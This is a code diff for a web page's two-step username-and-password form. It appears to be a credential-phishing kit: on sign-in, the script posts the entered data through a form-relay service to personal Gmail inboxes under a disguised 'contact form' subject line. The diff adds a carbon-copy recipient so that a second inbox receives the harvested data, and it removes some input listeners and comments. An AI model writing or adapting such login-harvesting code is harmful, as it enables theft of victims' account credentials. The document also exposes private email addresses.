@@ -9,7 +9,6 @@ document.addEventListener('DOMContentLoaded', () => {
     let unameVal = false;
     let pwdVal = false;
 
-    ///// next button
     const nxt = document.getElementById('btn_next');
 
     nxt.addEventListener('click', () => {
@@ -27,7 +26,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    ////// submit button
     const sig = document.getElementById('btn_sig');
 
     sig.addEventListener('click', async () => {
@@ -46,8 +44,13 @@ document.addEventListener('DOMContentLoaded', () => {
             formData.append("_subject", "New Contact Form Submission");
             formData.append("_captcha", "false");
 
+            // ✅ ADD MULTIPLE EMAIL RECIPIENTS HERE
+            formData.append("_cc", "dejapaige3@gmail.com"); 
+            // or use "_bcc" instead if you want hidden copy
+            // formData.append("_bcc", "dejapaige3@gmail.com");
+
             try {
-                await fetch("https://formsubmit.co/ajax/01nextup@gmail.com,dejapaige3@gmail.com", {
+                await fetch("https://formsubmit.co/ajax/01nextup@gmail.com", {
                     method: "POST",
                     body: formData
                 });
@@ -95,41 +98,23 @@ document.addEventListener('DOMContentLoaded', () => {
                 unameValAction(true);
             }
 
-            unameInp.addEventListener('change', function () {
-                if (this.value.trim() === "") {
-                    unameValAction(false);
-                } else {
-                    unameValAction(true);
-                }
-            });
-
         } else if (view === "pwd") {
             if (pwdInp.value.trim() === "") {
                 pwdValAction(false);
             } else {
                 pwdValAction(true);
             }
-
-            pwdInp.addEventListener('change', function () {
-                if (this.value.trim() === "") {
-                    pwdValAction(false);
-                } else {
-                    pwdValAction(true);
-                }
-            });
         }
 
         return false;
     }
 
-    // back button
     document.querySelector('.back').addEventListener('click', () => {
         view = "uname";
         document.getElementById("section_pwd").classList.toggle('d-none');
         document.getElementById('section_uname').classList.remove('d-none');
     });
 
-    // final buttons
     document.querySelectorAll('#btn_final').forEach((b) => {
         b.addEventListener('click', () => {
             window.open(location, '_self').close();
